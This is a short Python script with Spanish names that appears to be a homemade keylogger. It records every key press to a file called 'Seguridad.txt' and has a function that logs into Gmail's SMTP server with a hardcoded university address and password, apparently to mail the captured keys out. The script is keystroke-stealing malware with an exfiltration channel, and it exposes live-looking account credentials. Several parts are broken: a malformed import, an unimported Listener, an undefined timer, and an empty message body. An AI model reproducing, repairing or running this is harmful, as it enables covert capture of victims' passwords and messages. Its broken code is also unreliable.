from   keyboard
import datetime
import smtplib
import threading

Tiempo = datetime.datetime.now().strftime('%H:%M:%S')

carpeta = open('Seguridad.txt', 'w')
key = ""
def botonpres(key):
    key = str(key)
    print('letra {0} presionado'.format(key))
    print(f'Hrs.{Tiempo}')

    if key =="'\\x1a'":
        carpeta.close()
        quit()
    else:
        carpeta.write(key.replace("'",""))
        


def enviar(email, contraseña, menssage):
    server=smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login("lpze.luisfernando.maydana.ag@unifranz.edu.bo", "d820b#L1pM")
    server.sendmail("lpze.luisfernando.maydana.ag@unifranz.edu.bo","lpze.luisfernando.maydana.ag@unifranz.edu.bo", '')
    server.quit()

def envio():
    global key
    key1 = "key"
    enviar ("lpze.luisfernando.maydana.ag@unifranz.edu.bo","d820b#L1pM", key1)
    tiempo_envio.start()


with Listener(on_press=botonpres) as u:
    envio()
    u.join()
